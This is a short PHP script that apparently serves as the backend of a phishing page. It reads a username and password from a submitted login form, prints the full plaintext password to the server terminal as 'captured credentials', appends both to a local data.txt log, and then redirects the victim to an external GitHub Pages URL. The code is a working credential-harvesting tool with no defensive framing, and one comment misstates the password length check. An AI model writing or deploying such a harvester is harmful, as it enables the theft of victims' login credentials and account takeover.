<?php
// Check if the form was submitted using the POST method
if ($_SERVER["REQUEST_METHOD"] === "POST") {

    // Get the username and password from the form data.
    // The null coalescing operator (??) prevents errors if the fields are missing.
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    // --- VALIDATION ---
    // Basic validation to ensure the fields are not empty and meet minimum length requirements.
    if (strlen($username) < 6 || strlen($password) < 7) {
        // Send an error message directly to the terminal where the server is running.
        file_put_contents("php://stdout", "[!] Invalid input length. Username must be 6+ chars, Password 9+.\n");
        exit; // Stop the script
    }

    // --- TERMINAL OUTPUT ---
    // This will print the captured credentials directly to your terminal window.
    file_put_contents("php://stdout", "=== FORM DATA RECEIVED ===\n");
    file_put_contents("php://stdout", "Username: $username\n");
    file_put_contents("php://stdout", "Password: $password\n"); // <-- CHANGED: Now shows the full password
    file_put_contents("php://stdout", "==========================\n");

    // --- FILE LOGGING ---
    // This will save the credentials to a file named 'data.txt'.
    $logEntry = "User: $username | Pass: $password | Time: " . date("Y-m-d H:i:s") . "\n";
    file_put_contents("data.txt", $logEntry, FILE_APPEND);

    // --- REDIRECTION ---
    // After capturing the data, redirect the user to another page.
    header("Location: https://jaat-sachin.github.io/Pdfs/");
    exit; // Stop the script

} else {
    // If someone tries to access this file directly in their browser without submitting a form,
    // redirect them back to the login page.
    header("Location: index.html");
    exit;
}
?>
